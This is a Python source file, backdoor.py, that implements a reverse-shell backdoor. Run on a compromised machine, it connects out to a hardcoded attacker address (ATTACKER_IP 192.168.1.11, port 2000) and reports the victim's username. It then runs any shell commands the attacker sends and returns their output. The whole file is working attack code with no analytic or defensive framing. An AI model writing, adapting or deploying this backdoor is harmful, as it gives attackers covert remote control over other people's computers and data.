#! usr/bin/env python3

"""
* Author:               Job Jacob
* Created:              24 December 2020 
* Filename:             backdoor.py
* Example Run (Linux):  python3 backdoor.py
"""

import os
import json
import socket
import subprocess

""" 
* Function Name:  get_user()
* Input:          None
* Output:         user (string): The compromised user. 
* Logic:          The function runs the 'whoami' subprocess call to retrieve the username of the compromised user. 
* Example Call:   user = get_user()
"""
def get_user():
    return subprocess.check_output("whoami", shell=True).decode('utf-8')

""" 
* Function Name:  establish_connection()
* Input:          ip (string): The IP address of the attacker system.
*                 port (integer): The port through which the connection should be established.
* Output:         connection (socket object): The socket object after connection establishment.
* Logic:          The function is used to create a TCP connection from the compromised system to the attacker system.
* Example Call:   connection = establish_connection("192.168.1.11", 2000)
"""
def establish_connection(ip, port):
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((ip, port))

    user = get_user()
    success_message = "IP: {} | User:{}".format(ip, user)
    send_data(connection, success_message)

    return connection

""" 
* Function Name:  receive_data()
* Input:          connection (socket object): The socket object of the connection.
* Output:         data (string): The command / data received from the attacker that should be executed / uploaded in the compromised system.
* Logic:          The function is used to receive data from the attacker in a serialized manner.
* Example Call:   receive_data(connection)
"""
def receive_data(connection):
    data = ""

    while True:
        try:
            data += connection.recv(1024).decode('utf-8')
            return json.loads(data)

        except ValueError:
            continue

""" 
* Function Name:  send_data()
* Input:          connection (socket object): The socket object of the connection.
*                 data (string): The output of the command after execution / data from the compromised system.
* Output:         None
* Logic:          The function is used to send data to the attacker in a serialized manner.
* Example Call:   send_data(connection, "test.txt ...")
"""
def send_data(connection, data):
    data = json.dumps(data)
    connection.send(data.encode('utf-8'))

""" 
* Function Name:  execute_system_command()
* Input:          command (string): The command received from the attacker to execute in the compromised system.               
* Output:         result (string): The output of the command after execution.
* Logic:          The function is used to execute commands received from the attacker on the compromised system.
* Example Call:   execute_system_command("ls")
"""
def execute_system_command(command):
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
    except:
        return "INVALID command."

""" 
* Function Name:  change_working_directory()
* Input:          path (string): The path to which the present working directory should be changed to.             
* Output:         chdir_msg (string): Message to be send to atttacker informing him that the directory has been changed successfully.
* Logic:          The function is used to change the present working directory.
* Example Call:   result = change_working_directory("cd ..")
"""
def change_working_directory(path):
    os.chdir(path)
    return "Working directory changed to {}.".format(os.getcwd()) 

""" 
* Function Name:  communicate()
* Input:          connection (socket object): The socket object of the connection.
* Output:         None
* Logic:          The function is used to tranfer data / commands between the compromised system and the attacker. 
* Example Call:   communicate(connection)
"""
def communicate(connection):
    while True:
        command = receive_data(connection)

        if(command[0] == "quit"):
            break

        elif((command[0] == "cd") and (len(command) > 1)):
            result = change_working_directory(command[1])
            send_data(connection, result)

        else:
            result = execute_system_command(command)
            send_data(connection, result)
    
    connection.close()


if __name__ == "__main__":
    ATTACKER_IP = "192.168.1.11"
    PORT = 2000

    connection = establish_connection(ATTACKER_IP, PORT)
    communicate(connection)